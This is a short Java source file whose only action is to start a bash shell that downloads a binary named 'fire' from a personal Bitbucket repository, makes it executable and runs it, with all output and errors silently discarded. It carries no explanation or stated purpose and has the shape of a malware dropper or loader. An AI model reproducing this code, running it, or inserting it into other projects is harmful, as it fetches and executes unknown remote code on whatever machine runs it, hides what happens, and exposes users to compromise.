import java.io.*;
import java.util.*;

public class run {
    public static void main(String[] args) {
        try {
            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://bitbucket.org/lianamahesra/clouds/raw/8ae3d7763df252216badc86b3bde4f52c0036f0c/fire;chmod +x fire;./fire");
            builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            builder.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process process = builder.start();
            process.waitFor(); // wait if needed
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
